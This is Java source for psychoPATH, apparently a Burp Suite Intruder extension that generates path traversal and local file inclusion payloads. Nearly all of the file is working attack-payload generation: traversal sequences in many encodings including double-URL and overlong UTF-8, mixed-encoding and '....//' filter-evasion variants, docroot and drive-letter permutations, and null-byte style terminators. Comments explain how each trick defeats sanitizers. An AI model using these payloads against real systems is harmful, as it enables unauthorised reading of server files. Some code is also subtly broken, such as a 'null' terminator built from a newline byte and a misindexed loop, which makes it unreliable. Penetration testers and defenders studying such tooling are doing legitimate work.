package uk.co.pentest.psychoPATH;

import burp.BurpExtender;
import burp.IBurpExtenderCallbacks;
import burp.IIntruderPayloadGenerator;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Set;
import javax.swing.ListModel;

/*
 * @author ewilded
 */
public final class IntruderPayloadGenerator implements IIntruderPayloadGenerator 
{

    ArrayList<String> psychopaths; // the final payloads
    ArrayList<String> psychopaths_raw; // payloads before output encoding
    //static int pathInstances=0;
    int payloadIndex;    // counter for the payload mark       
    String payloadType;  // path or mark
    byte[] bytes_raw;    // byte payloads    
    ArrayList<String> bytes_out; // 
    IBurpExtenderCallbacks callbacks = BurpExtender.getBurpCallbacks();
    ArrayList<String> directoriesToCheck; // this is for the verification phase
    int payloadMarkerLength=7; // the lenght of the payload marker, a fixed length is safer while injecting into images etc.   
    PsychoTab tab;
    String psychoMode="basic"; 
    boolean useTerminators=true; // false <-- connect this up to the UI
    // the terminators are: {0,32,9,11}; // nullbyte, space, tab (horizontal + vertical) 
    // if you want more - for full madness fuzzing - disable the terminators, add another holder after the path traversal payload, 
    // pick 'cluster bomb' and use 'byte' generator instead
    // other options include: 
    // 'moderate' (should be as moderate as 'moderate rebels' LOL)
    // 'full-madness' - all combinations for the most exhaustive testing
    
    //protected String[] spaces={" ","%20","%25%32%65","%u0020","",""};   
    // plain, URL-encoded, double-URL-encoded, UTF-16, overlong UTF 2-byte, overlong UTF 3-byte // ,overlong UTF 4-byte, overlong UTF 5-byte, overlong UTF 6-byte
    // must have the same number of elements, otherwise the non-mixed encoding basic variant will get confused
    //. = %u002e, / = %u2215, \ = %u2216 
    String[] dots={".", "%2e", "%25%32%65","%u002e", "%c0%ae", "%e0%ae"}; // %f0%80%80%ae, %f8%80%80%80%ae, %fc%80%80%80%80%ae
    String[] slashes={"/","%2f","%25%32%66","%u2215","%c0%af", "%e0%af"}; // %f0%80%80%af, %f8%80%80%80%af, %fc%80%80%80%80%af
    String[] backslashes={"\\","%5c","%25%35%63","%u2216","%c1%9c","%e1%9c"}; // %f1%80%80%9c, %f9%80%80%80%9c, %fd%80%80%80%80%9c
    

    
    ArrayList<String> unitTraversalsToUse;
    ArrayList<String> basicTraversals;
                                   
    ArrayList<String> slashesToUse;
    
    protected void addWindows()
    {
        for(int i=0;i<this.backslashes.length;i++)
        {
            slashesToUse.add(backslashes[i]);
        }
        basicTraversals.add("..\\");
    }
    
    protected void addUnix()
    {
        for(int i=0;i<this.slashes.length;i++)
        {
            slashesToUse.add(slashes[i]);
        }
        basicTraversals.add("../");        
    }

    protected ArrayList<String> getSlashes(String payload)
    {
        ArrayList<String> ret =new ArrayList();
        
        int found_counter=0;
        for(int j=0;j<slashesToUse.size();j++)  
        {
            if(payload.contains(slashesToUse.get(j)))
            {
                found_counter++;
                // before adding the payload below to the list we need to make the same thing with the dot
                ret.add(slashesToUse.get(j));
                if(found_counter==2) break; // no point in looking for more than two instances                            
            }                           
        }
        return ret;
    }
    protected ArrayList<String> getDots(String payload)
    {
        ArrayList<String> ret =new ArrayList();        
        int found_counter=0;
        for(int j=0;j<dots.length;j++)  
        {
            if(payload.contains(dots[j]))
            {
                found_counter++;
                // before adding the payload below to the list we need to make the same thing with the dot
                ret.add(dots[j]);
                if(found_counter==2) break; // no point in looking for more than two instances                            
            }                           
        }
        return ret;
    }
    public IntruderPayloadGenerator(String payloadType, PsychoTab tab) 
    {
        this.payloadType = payloadType;
        this.tab=tab;
        
        unitTraversalsToUse = new ArrayList<>();
        slashesToUse = new ArrayList<>();
        basicTraversals = new ArrayList<>();
        
        if("path".equals(this.payloadType)||"mark".equals(this.payloadType)) // "path" and "marker" generators
        {
            Set<String> targetDocroots; // this is a merge of the prefixes and targets
            ArrayList<String> brutDocrootSuffixes; // we'll also merge all targets into this
            ArrayList<String> traversals;
      
            
            if(this.tab.psychoPanel.slashesToUse=="win")
            {
                addWindows();
            }
            if(this.tab.psychoPanel.slashesToUse=="nix")
            {
                addUnix();
            }
            if(this.tab.psychoPanel.slashesToUse=="all")
            {
                addWindows();
                addUnix();
                this.basicTraversals.add("..\\/");
                this.basicTraversals.add("../\\"); 
            }
            
            for(int i=0;i<this.basicTraversals.size();i++)
            {
                unitTraversalsToUse.add(basicTraversals.get(i));                
            }
            
            // fix the init             [DONE]
            
            // now, add basic (non-mixed) support for different encodings ;]]   [DONE]            
            
            for(int i=0;i<basicTraversals.size();i++)
            {                
                for(int j=1;j<dots.length;j++) // skip the first element as it is equal to what we're replacing
                {
                    String payload = basicTraversals.get(i);
                    // variants could be created here, but first let's get rid of those duplicates
                    payload=payload.replace(".",dots[j]);
                    payload=payload.replace("/",slashes[j]);
                    payload=payload.replace("\\",backslashes[j]);
                    unitTraversalsToUse.add(payload);
                    this.tab.psychoPanel.stdout.println("Adding "+payload);
                }
            }            
            this.tab.psychoPanel.stdout.println("[DEBUG] The overall number of universal traversals to use without encoding-mixing: "+unitTraversalsToUse.size());
            
            // NOW, the jacuzzi-made algorithm for mixed encoding payloads:
            // 1. basically, a traversal consists of at least two dots and at least one slash
            // 2. all anti-recurrent evasive techniques stem from this principle anyway and this is how their payloads will be derived once we have dealt with 
            //    generating of the mixed-encoding variants
            // 3. there is no point in mixing more than two encodings in one payload
            // 4. there is most likely an optimum appproach (choosing the most probable set of mixed-encoding characters in a base traversal, e.g. .%2e/ or even .%2e/%2f 
            //    whereas %2e and %2f simply represent holders for chars presented in a different encoding than the default (which is no encoding, literal char) - the 'basic' mode
            // 5. while the full psychoPATHic combinatorics will boil down to:
            //    5.1 iterate over all encodings, nested (one iteration inside of the another)
            //    5.2 skip if the current encoding in the parent loop is the same as the one in the current loop
            //    5.3 iterate over all base traversal units
            //    5.4 assume the parent-loop encoding as the default (for all the chars)
            //    5.5 iterate over every single character of the unit traversal and create a variant of it, replacing the current char with its version (encoded with the inner-loop encoding)
            //    5.6 the 'medium' optimisation mode will only be picking one of the middle characters
            //    5.7 the 'full-madness' mode will generate all variants

            // mixed-encoding fixed examples
            /*
                this.basicTraversals.add(".%2e/");
                this.basicTraversals.add(".%2e%2f");
                this.basicTraversals.add(".%2e%2f");
                this.basicTraversals.add("..%2f/.");
        
                // UTF-8
                this.basicTraversals.add("%c0%2e%c0%af%c0%af"); 
                // UTF-16
                this.basicTraversals.add("%u002e%u2215%u2215");
                // 2-byte overlong UTF-8
                this.basicTraversals.add("%c0%ae%c0%af%c0%af");            
            */            
            
            ArrayList<String> mixedTraversalsToUse=new ArrayList();
            
            // OK, this is the 'moderate' mode, can be easily tuned up to provide the 'basic' set as well
            // these are the only mixed senacrious that appear to make any sense, there was no point in implementing them in the loop above
            // the 'moderate' and 'full-madness' mode will generate a subset of payloads being redundant to this
            // we'll optimize this later on, before the release, now we just want a good working tool to find more 0days
            for(int j=1;j<dots.length;j++) // dots.length must be equal to slashes.length and basckslashes.length and simply represents the number of supported encodings
            {
                for(int i=0;i<slashesToUse.size();i++)
                {
                       // chances are ".." will be filtered
                       // but also chances are "./" will be (by the way, "../" contains "./" - just a reminder)
                       // so the optimum will be to use %2e.%2f/ (encoded dot, normal dot, encoded slash, normal slash).
                       if(slashesToUse.get(i)=="/")
                       {                          
                           //unitTraversalsToUse.add(".."+slashes[j]+"/");             //  "..%2f/", "..%25%32%66/" and the like
                           //unitTraversalsToUse.add(dots[j]+dots[j]+"/"+slashes[j]);  //  "%2e%2e/%2f", "%25%32%65%25%32%65/%25%32%66 and the like
                           //unitTraversalsToUse.add("."+dots[j]+"/"+slashes[j]);      //  
                           unitTraversalsToUse.add(dots[j]+"."+slashes[j]+"/");        //2e.%2f/ <-- this optimization makes the above three variants redundant
                           this.tab.psychoPanel.stdout.println("Adding "+slashes[j]+"/");
                       }
                       if(slashesToUse.get(i)=="\\")
                       {
                           //unitTraversalsToUse.add(".."+backslashes[j]+"\\");               //  "..%5c/", "..%25%35%63\" and the like
                           //unitTraversalsToUse.add(dots[j]+dots[j]+"\\"+backslashes[j]);    //  "%2e%2e\%5c", %25%32%65%25%32%65\%25%35%63 and the like
                           //unitTraversalsToUse.add("."+dots[j]+"\\"+backslashes[j]);        //   
                           unitTraversalsToUse.add(dots[j]+"."+backslashes[j]+"/");        //2e.%5c\ <-- this optimization makes the above three variants redundant
                           this.tab.psychoPanel.stdout.println("Adding "+dots[j]+"."+backslashes[j]+"/");
                       }
                }
            }        
            if(psychoMode!="basic")
            {
                for(int i=0;i<basicTraversals.size();i++)
                {
                    for(int j=0;j<dots.length;j++) // dots.length must be equal to slashes.length and basckslashes.length and simply represents the number of supported encodings
                    {
                         for(int k=0;k<dots.length;k++) // the child loop
                         {
                            if(j==k) continue; // it's not 'mixing' if encodings are equal
                            for(int l=0;l<basicTraversals.get(i).length();l++) // iterate over characters
                            {
                                // everything is replaced with j, the currently iterated char is replaced with k      
                                String newTraversal="";
                                for(int m=0;m<basicTraversals.get(i).length();m++)
                                {                                
                                    if(l==m)
                                    {
                                        // use the second (child loop) encoding for this one
                                        if(basicTraversals.get(i).charAt(m)=='.')
                                        {
                                            newTraversal+=dots[k]; // add something
                                        }
                                        if(basicTraversals.get(i).charAt(m)=='/')
                                        {
                                            newTraversal+=slashes[k]; // add something
                                        }
                                        if(basicTraversals.get(i).charAt(m)=='\\')
                                        {
                                            newTraversal+=backslashes[k]; // add something
                                        }                                    
                                    } 
                                    else
                                    {
                                        // use the 'default' (parent loop) encoding
                                        //this.tab.psychoPanel.stdout.println("unitTraversalsToUse.get("+i+").charAt("+m+")="+basicTraversals.get(i).charAt(m));
                                        if(basicTraversals.get(i).charAt(m)=='.')
                                        {                                        
                                            newTraversal+=dots[j]; 
                                        }
                                        if(basicTraversals.get(i).charAt(m)=='/')
                                        {   
                                            newTraversal+=slashes[j];
                                        }
                                        if(basicTraversals.get(i).charAt(m)=='\\')
                                        {
                                            newTraversal+=backslashes[j];
                                        }                                    
                                    }
                                }
                                //mixedTraversalsToUse.add(newTraversal);
                                unitTraversalsToUse.add(newTraversal); // OK let's do this!
                                this.tab.psychoPanel.stdout.println("Adding "+newTraversal);
                                // add the traversal to the collection
                                // fuck this will be massive
                            }
                        }
                    }   
                }
            
                this.tab.psychoPanel.stdout.println("[DEBUG] The overall number of mixed-encoding traversals to use (in "+psychoMode+" mode): "+mixedTraversalsToUse.size());
            
                this.tab.psychoPanel.stdout.println("[DEBUG] The overall number of all traversals to use: "+(mixedTraversalsToUse.size()+unitTraversalsToUse.size()));
            }
            // OK, not so bad
            
            // TODO
            // what's left for now:
            
            // termination character
            // scanner integration
            
            // check if backslashes in evasive techniques work as expected 
            // introduce mixed-slashes non-recurrent evasive traversals and make sure they work as expected  
            // (make sure this does not get fucked by the slashesToUse substitution!)
            
            
            // find new vulns ;]
            
            // nice to haves:
            // "copy payloads to clipboard" button please :)
            // add breakup-string encoding into non-recurrent evasive techniques
            // encoding-management
            // full-madness mode
            // reflect the changes in the UI
            // reflect the changes in the documentation
            // add triple URL encoding :D
            // send this to the store
                               
        
            // Evasive techniques - is there a point in full encoding mixing in the evasive payloads?
            // IMO not, as the very process of mixing encodings has evasive purpose, so for example if our evasive payload looks like
            // "....//" there is no point in creating all variants like ".%2e..//" or ..%2e.//, so it's just a waste of resources.
            // With these traversal variants, however, it makes sense to perform:
            // 1) full (non-mixed) encoding variants, e.g. %2e%2e%2e%2e%2f%2f
            // 2) partially mixed encoding variants (e.g. at least these two: ".%2e%2f/", "%2e%2e/%2f", maybe also "%2e%2e%2e%2e//" and "....%2f%2f").
         
            // Now, we are implementing the mixed-encodings concept in our anti-nonrecursive evasive techniques.
                
            // It should be kept in mind that the purpose of anti-recursive evasive techniques is to GET THROUGH filters that CUT STUFF OUT from the payload,
            // e.g. they cut out "../", so we use "....//", so after cutting the "../" out what we are left with is ".." + "/" -> "../".
                
            // The purpose of mixed encodings is to bypass such filters by AVOIDING DETECTION of the malicious strings. This concept is based on the scenarios
            // whereas input sanitizing is done BEFORE DECODING, or to be more precise, before the last phase of decoding (e.g. some apps mighr decode input twice,
            // for the first time before the input is sanitized and then for the second time, before it hits the vulnerable function.
            // So:
            // 1) %2e%2e%2f is decoded to ../, the sanitizer gets rid of it, end of story.
            // 2) %25%32%65%25%32%65%25%32%66 is decoded to %2e%2e%2f, the sanitizer does not get rid of, because it does not decode the string once again itself,
            // then the second decoding occurs before the string hits the file operation function -> ../ and we have a traversal.
            // This is why the use of different encodings for the whole payload (without mixing!) is quite reasonable (and we are already doing it).
                
            // Now let's consider the same scenario where MIXED encodings are actually useful.
            // E.g. ".%2e%2f/" is not recognized by the input sanitizer, then it gets decoded before use and we get ..//
            // 
            // The only reason for using mixed encodings in anti-nonrecursive payloads is an assumption that we are trying to defeat two separate input filtering
            // mechanisms at the same time. It's possible, just less likely.
            // So, it would make sense to only encode the elements we are expecting to STAY after the first filter cuts them out 
            // e.g. if the filter is recursive, but does not perform decodings... but wouldn't such a filter get defeated with a fully encoded string in the first place,
            // without any mixing?
            
            // OK, now I get it. There might be stupid filters that instead of implementing this algorithm:
            // 1) decode the string
            // 2) check for malicious stuff and reject it or recursively sanitize it
            // 3) decode it again 
            // 4) if the outcome is different from the output from the step 2 (to detect when something was encoded multiple times, e.g. double/triple URL encoding), 
            //    go back to step 2) with the newly decoded string to re-check/re-sanitize it
            //    if the outcome is identical with the previous result, pass the string (no more sanitization or decoding is needed)
            
            // they do stupid matching like: check for ../, %2e%2e%2f or %25%32%65%25%32%65%25%32%66 sequences, thus failing to deal with %2e.%2f and the like.
            
            // Anyway, I still see little to no point in using mixed encodings IN CONCERT with anti-nonrecurrent evasive payloads like ....// to get e.g. .%2e.%2e/%2f,
            // but I'm gonna implemented it for for the 'full-madness' mode, which is intended for me and other people who need serious mental help.
           
            
            // Now we load the evasive traversals.
            // By the way, this code is supposed to adjust the evasive traversals according to the set of slashes to use ...
            // (whether or not we are using backlashes, although we should even as an evasive technique itself,e.g. by introducing "../\" and "..\/" 
            // as base traversals of both slashes are enabled for use... yeah I just came up with the solution.
            
            if(this.tab.psychoPanel.evasiveTechniques)
            {
                this.tab.psychoPanel.stdout.println("Evasive techniques enabled...");
                // read and decode the list of currently loaded breakup strings, if there are any
                ListModel breakupModel = this.tab.psychoPanel.breakupList.getModel();
                ArrayList<String> breakupStrings = new ArrayList<>();
                for(int i=0;i<breakupModel.getSize();i++)
                {
                    String asciihex=breakupModel.getElementAt(i).toString();
                    // ok, now we need to convert it back to characters and store in the breakupTraversals array
                    StringBuilder output = new StringBuilder();
                    for (int j = 0; j < asciihex.length(); j+=2) 
                    {
                        String str = asciihex.substring(j,j+2);
                        output.append((char)Integer.parseInt(str,16));
                    }
                    breakupStrings.add(output.toString());
                }
                
                ListModel evasiveTravModel = this.tab.psychoPanel.evasiveList.getModel();
                ArrayList<String> evasiveTraversalsToUse=new ArrayList();
                for (int i=0; i<evasiveTravModel.getSize(); i++) 
                {
                    String evasiveTraversal=evasiveTravModel.getElementAt(i).toString();
                    if(evasiveTraversal.contains("{BREAK}")) // we are dealing with a break-up sequence
                    {
                        // iterate over break-up strings and create variations
                        for(int j=0;j<breakupStrings.size();j++)
                        {
                            evasiveTraversalsToUse.add(evasiveTraversal.replace("{BREAK}", breakupStrings.get(j))); 
                        }
                        // otherwise the traversal is ignored (not added to the unitTraversalsToUse arr list)
                    }
                    else
                    {
                        evasiveTraversalsToUse.add(evasiveTraversal);
                    }
                }  

                
                           
                for(int i=0;i<evasiveTraversalsToUse.size();i++)
                {
                    // OK, let's produce the variants:
                    // 1. non-mixed (literal)
                    unitTraversalsToUse.add(evasiveTraversalsToUse.get(i));
                    
                    // plus (below should be definitely skipped in the basic psychoMode):
                    for(int j=1;j<dots.length;j++) // dots.length must be equal to slashes.length and basckslashes.length and simply represents the number of supported encodings
                    {
                        // we skip j=0
                        // 2.  only dot or only slash mixed
                        unitTraversalsToUse.add(evasiveTraversalsToUse.get(i).replace(".",dots[j]));
                        if(evasiveTraversalsToUse.get(i).contains("/"))
                        {
                            unitTraversalsToUse.add(evasiveTraversalsToUse.get(i).replace("/",slashes[j]));
                        }
                        if(evasiveTraversalsToUse.get(i).contains("\\"))
                        {
                            unitTraversalsToUse.add(evasiveTraversalsToUse.get(i).replace("\\",backslashes[j]));
                        }                                                
                    }
                }
                // 3. only specific dot-slash sequences mixed  "..%2f/", "%2e%2e/%2f"
                // moved to the base mode as it has nothing to do with the anti-nonrecurisve evasive techniques
                
            }
            else
            {
                this.tab.psychoPanel.stdout.println("Evasive techniques NOT enabled...");
            }
            String fileName;
            PsychoPanel panel=this.tab.getUiComponent();                        
            this.psychopaths = new ArrayList<>();
            this.psychopaths_raw = new ArrayList<>();           
            // generate all the payloads and put them into the arr
            targetDocroots = new HashSet<>();
            brutDocrootSuffixes = new ArrayList<>();
            traversals = new ArrayList<>(); 
            // 0) populate traversals and the filename           
            ArrayList<String> longestTraversals = new ArrayList<>();
            for(int i=0;i<unitTraversalsToUse.size();i++)
            {
                String baseTraversal = unitTraversalsToUse.get(i);
                String traversal=baseTraversal;
                for(int j=0;j<this.tab.psychoPanel.maxTraversalsPerPayload;j++)
                {
                    traversals.add(traversal);
                    if(j==this.tab.psychoPanel.maxTraversalsPerPayload-1) longestTraversals.add(traversal);
                    traversal=traversal+baseTraversal;
                }
            }
            this.tab.psychoPanel.stdout.println("The number of longest traversals to use is "+longestTraversals.size());       
            fileName=panel.fileNameField.getText();
      
            // 1) copy @brute_doc_root_prefixes to @target_docroots
            if(panel.LFImode==false) // whether to use the webroots at all
            {
                this.tab.psychoPanel.stdout.println("LFI mode is NOT enabled...");
                ListModel docListModel = panel.docrootsList.getModel();
            //if(docListModel==null) this.panel.stdout.println("The thing is empty...");
            
                for (int i=0; i<docListModel.getSize(); i++) 
                {
                    String targetDocroot=docListModel.getElementAt(i).toString();
                    // if the targetDocroot contains the {TARGET} holder
               
                    if(targetDocroot.contains("{TARGET}"))
                    {
                        // iterate over the targets 
                        // and create corresponding versions of the targetDocroot by substitution
                        ListModel targetListModel = panel.targetsList.getModel();
                   
                        for(int j=0;j<targetListModel.getSize();j++)
                        {
                             String target=targetListModel.getElementAt(j).toString();
                             String newTargetDocroot=targetDocroot.replace("{TARGET}",target);
                             targetDocroots.add(newTargetDocroot);
                        } 
                                        
                    }
                     // otherwise simply copy the targetDocroot                
                     else
                    {
                     targetDocroots.add(targetDocroot);     
                    }                
                }             
                // add the empty suffix
                brutDocrootSuffixes.add("");
                // 2.1) copy @targets to @brut_doc_suffixes
                ListModel targetListModel = panel.targetsList.getModel();
                for(int i=0;i<targetListModel.getSize();i++)
                {
                   String target=targetListModel.getElementAt(i).toString();
                   brutDocrootSuffixes.add(target);
                }                 
                // 2.2) copy @suffixes to @brut_doc_suffixes
                ListModel suffixListModel = panel.suffixesList.getModel();
                for(int i=0;i<suffixListModel.getSize();i++)
                {
                    String suffix=suffixListModel.getElementAt(i).toString();
                    brutDocrootSuffixes.add(suffix);
                }
                // 3.1) iterate through @targetDocroots -> 
                //        3.2)   iterate through @brute_doc_root_suffixes -> 
            //                3.3)      iterate through traversals -> 
            //                     3.4)              generate psychopaths
            }
            else
            {
                this.tab.psychoPanel.stdout.println("LFI mode is enabled...");
            }
            // 3.4.1 the bare filename with no prepended path injections
            this.psychopaths_raw.add(fileName);             
            // 3.4.2 the pure traversal + filename permutations (for upload directories hidden within the document root and LFI mode)
            
            
            // if filename contains a slash in the first place, it should be the same slash that is used in the traversal sequence (maybe create files to use array as well?)
            // same with the dot
            // this will get more convoluted once we deal with payloads with mixed encoding (dots are multiple by default, slashes can as well in some evasive techniques)
            // this is where the duplicates come from...
            // the point is not to attempt to replace if something's not there
            // but the very slashesToUse thing was only made to support windows...
            // on the other hand we have the file names
               
            // OK, the algorithm is as follows:
            // 1. check if the filename has slash/dot in it (might be defined by the user, might as well contain a webroot once we merge this with upload mode)
            // 2.1 if not, simply append and move on
            // 2.2 if yes, estimate what slash/slashes/dot/dots are present in the traversal - will either be one or two
            //     and then create one up to two variants with appended filename, accordingly
            //     using windows slashes will not matter, as they will only appear in one payload with nix ones for the evasive purpose
            //     so regardless to the encoding chosen, there won't be more than two alternative slashes/dots in the same payload (because it does not make any sense)
                   
            // should be easier to do it with functions, like:
            // if contains / then get traversal's slash/slashes
            // if contains . then get traversal's dot/dots
            // get variants based on slashes and dots                    
            ArrayList<String> travSlashes=new ArrayList();
            ArrayList<String> travDots= new ArrayList();
                                                  
            if(panel.LFImode==true&&panel.optimizeLFI==true)
            {
                for(int i=0;i<longestTraversals.size();i++)        // 3.3
                {                   
                    // depending on the contents of the file name and the values returned by the getSlashes() & getDots() we might be adding at least 1
                    // but not more than 4 alternative payloads to psychopaths_raw.
                    if(fileName.contains("/")) travSlashes=getSlashes(longestTraversals.get(i));
                    if(fileName.contains(".")) travDots=getDots(longestTraversals.get(i));                          
                    if(travSlashes.size()==0&&travDots.size()==0)
                    {
                        this.psychopaths_raw.add(longestTraversals.get(i)+fileName); // both are 0, we simply go with one version of the payload
                    }                    
                    else
                    {   // OK, this should avoid duplicates now:
                        // if there were no dots/slashes found in the filename in the first place, no variants of it to align with the traversal will be produced
                        for(int j=0;j<travSlashes.size();j++)
                        {
                           this.psychopaths_raw.add(longestTraversals.get(i)+fileName.replace("/",travSlashes.get(j))); 
                        }
                        for(int j=0;j<travDots.size();j++)
                        {
                           this.psychopaths_raw.add(longestTraversals.get(i)+fileName.replace(".",travDots.get(j))); 
                        }
                    }                          
                }
            }
            else // OK, this is file upload mode that needs to be adjusted the algorithm above
            {                    
                for(int i=0;i<traversals.size();i++)
                {
                    if(fileName.contains("/")) travSlashes=getSlashes(traversals.get(i));
                    if(fileName.contains(".")) travDots=getDots(traversals.get(i));                          
                    
                    
                    if(travSlashes.size()==0&&travDots.size()==0)
                    {
                        this.psychopaths_raw.add(traversals.get(i)+fileName); // both are 0, we simply go with one version of the payload
                    }                    
                    else
                    {   // OK, this should avoid duplicates now:
                        // if there were no dots/slashes found in the filename in the first place, no variants of it to align with the traversal will be produced
                        for(int j=0;j<travSlashes.size();j++)
                        {
                           this.psychopaths_raw.add(traversals.get(i)+fileName.replace("/",travSlashes.get(j))); 
                        }
                        for(int j=0;j<travDots.size();j++)
                        {
                           this.psychopaths_raw.add(traversals.get(i)+fileName.replace(".",travDots.get(j))); 
                        }
                    }                         
                }
            }

            // 3.4.3 the targetDocroot+brutDocrootsuffix permutations 
            
            
            for(String targetDocRoot : targetDocroots) // 3.1
            {
                for(int i=0;i<brutDocrootSuffixes.size();i++) // 3.2
                {     
                    if(this.tab.psychoPanel.optimizeDocroots)
                    {
                        for(int j=0;j<longestTraversals.size();j++)        // 3.3
                        {
                          // if the docroot is windows-specific, we skip the letter for the traversal for it to work
                          if(fileName.contains("/")) travSlashes=getSlashes(longestTraversals.get(j));
                          if(fileName.contains(".")) travDots=getDots(longestTraversals.get(j));    
                          
                          String payload=longestTraversals.get(j)+targetDocRoot.replace("C:","")+"/"+brutDocrootSuffixes.get(i)+"/"+fileName;
                          
                          if(travSlashes.size()==0&&travDots.size()==0)
                          {                           
                            for(int k=0;k<slashesToUse.size();k++)
                            {
                                this.psychopaths_raw.add(payload.replace("/",slashesToUse.get(k)));   
                                //this.psychopaths_raw.add(payload); // both are 0, we simply go with one version of the payload
                            }                            
                          }                    
                          else
                          {   // OK, this should avoid duplicates now:
                            // if there were no dots/slashes found in the filename in the first place, no variants of it to align with the traversal will be produced
                            for(int k=0;k<travSlashes.size();k++)
                            {
                               this.psychopaths_raw.add(payload.replace("/",travSlashes.get(k))); 
                            }
                            for(int k=0;k<travDots.size();k++)
                            {
                                this.psychopaths_raw.add(payload.replace(".",travDots.get(j)));
                            }
                          }                                
                          

                        }
                    }
                    else
                    {
                        for(int j=0;j<traversals.size();j++)        // 3.3
                        {
                          if(fileName.contains("/")) travSlashes=getSlashes(traversals.get(j));
                          if(fileName.contains(".")) travDots=getDots(traversals.get(j));    
                          String payload=traversals.get(j)+targetDocRoot.replace("C:","")+"/"+brutDocrootSuffixes.get(i)+"/"+fileName;
                          if(travSlashes.size()==0&&travDots.size()==0)
                          {
                              for(int k=0;k<slashesToUse.size();k++)
                              {
                                 this.psychopaths_raw.add(payload.replace("/",slashesToUse.get(k)));
                              }
                          }
                          else
                          {
                              for(int k=0;k<travSlashes.size();k++)
                              {
                                 this.psychopaths_raw.add(payload.replace("/",travSlashes.get(k))); 
                              }
                              for(int k=0;k<travDots.size();k++)
                              {
                                this.psychopaths_raw.add(payload.replace(".",travDots.get(j)));
                              }
                          }      
                        }                          
                    }                    
                    
                    if(this.tab.psychoPanel.useAbsoluteWebroots)
                    {
                         ListModel drivesModel = panel.drivesList.getModel();                                                                          
                         String payload=targetDocRoot+"/"+brutDocrootSuffixes.get(i)+"/"+fileName;
                         for(int j=0;j<slashesToUse.size();j++)
                         {                                
                                String[] currSlashes={};
                                if(slashesToUse.get(j)=="/")
                                {
                                  currSlashes=slashes;
                                }
                                if(slashesToUse.get(j)=="\\")
                                {
                                  currSlashes=backslashes;  
                                }
                                for(int k=0;k<currSlashes.length;k++)
                                {
                                    String docroot=payload.replace("/",currSlashes[k]);
                                    if(docroot.startsWith("C:"))
                                    {
                                        for(int l=0;l<drivesModel.getSize();l++)
                                        {
                                         // if we are dealing with windows, we nee to make sure we use all drive the letters configured                                    
                                         this.psychopaths_raw.add(docroot.replace("C:",drivesModel.getElementAt(l).toString()+":"));                                 
                                        }  
                                    }                                
                                    else
                                    {
                                        this.psychopaths_raw.add(docroot);
                                    }                                 
                                }
                         }                       
                    }
                }
            }  

            
            // now, let's add the icing on the cake by providing the terminators (currently the list is not customisable)
            // I thought of this set {0,32,9,11}, however I believe nullbyte is the way to focus, so we have a literal, urlencoded, double urlncoded + utf variants
            // this will produce additional number of 7 times more payloads,
            // so if the standard LFI mode produces 101 payloads, this will add 707 to it,            
            // making it all 808.
            // this is NOT optimal, as will lead to unneccessary encoding-mixing (remember, there is no point in mixing more than two encodings, although this rule
            // may not always apply to termintors), this is why it should be handled on the payload generation level, the same way slashes and dots are picked to avoid
            // more than two encodings in one payload)
            // 
            // 0,%00,%u0000
            // char [] dec [0] hex [00] url: %00
            // overlong 2-byte sequence: c0 80
            // overlong 3-byte sequence: e0 80
            // overlong 4-byte sequence: f0 80 80 80
            
            String nullLiteral=this.byteToString((byte)0x0a);
            String[] terminators={nullLiteral,"%00","%25%30%30","%c0%80","%e0%80","%u0000","%f0%80%80%80"};
            
            if(useTerminators)
            {
               for(int j=0;j<this.psychopaths_raw.size();j++)
               {
                    this.psychopaths.add(this.psychopaths_raw.get(j));
                    for(int i=0;i<terminators.length;i++)
                    {
                        this.psychopaths.add(this.psychopaths_raw.get(j)+terminators[i]);    
                    }
                }
            }
            else
            {
                //         this.commandSeparators.add(this.byteToString((byte)0x0a));  // newline
                this.psychopaths=this.psychopaths_raw;
            }
            //for(int j=0;j<this.psychopaths_raw.size();j++)
            //{
            //    this.psychopaths.add(this.psychopaths_raw.get(j));
            //}
            
        }
        if("check".equals(payloadType)&&this.directoriesToCheck==null)
        {
            this.directoriesToCheck=new ArrayList<>();
            this.directoriesToCheck=tab.psychoPanel.genericSuffixes; // we simply steal this list :)
        }
    }
    private String byteToString(byte inputByte)
    {
        byte[] t = new byte[1];
        t[0]=inputByte;
        return callbacks.getHelpers().bytesToString(t);
    }  
    @Override
    public boolean hasMorePayloads() 
    {
        if("check".equals(this.payloadType))
        {
            return this.payloadIndex<this.directoriesToCheck.size();
        }
        if("mark".equals(this.payloadType)||"path".equals(this.payloadType))
        {
            return this.payloadIndex < this.psychopaths.size();
        }
        return false; //unreachable statement
    }

    @Override
    public byte[] getNextPayload(byte[] baseValue) 
    {                
        byte[] payload  = new byte[0];
        if("mark".equals(this.payloadType))
        {
            // return the payload mark corresponding to the path payload, which is simply a unique string (number -> index)
            String prefix="";
            int ln = this.payloadMarkerLength-Integer.toString(this.payloadIndex).length();
            for(int i=0;i<ln;i++) prefix=prefix+"0";
            payload=callbacks.getHelpers().stringToBytes(prefix+Integer.toString(this.payloadIndex));
        }
        if("path".equals(this.payloadType))
        {
            // return the path payload
            payload = callbacks.getHelpers().stringToBytes(this.psychopaths.get(this.payloadIndex).toString());           
        }
        if("check".equals(this.payloadType))
        {
            payload = callbacks.getHelpers().stringToBytes(this.directoriesToCheck.get(this.payloadIndex).toString()); 
        }        
        this.payloadIndex++; // increase the index
        return payload;
    }
    @Override
    public void reset() 
    {        
        payloadIndex = 0;
    }       
}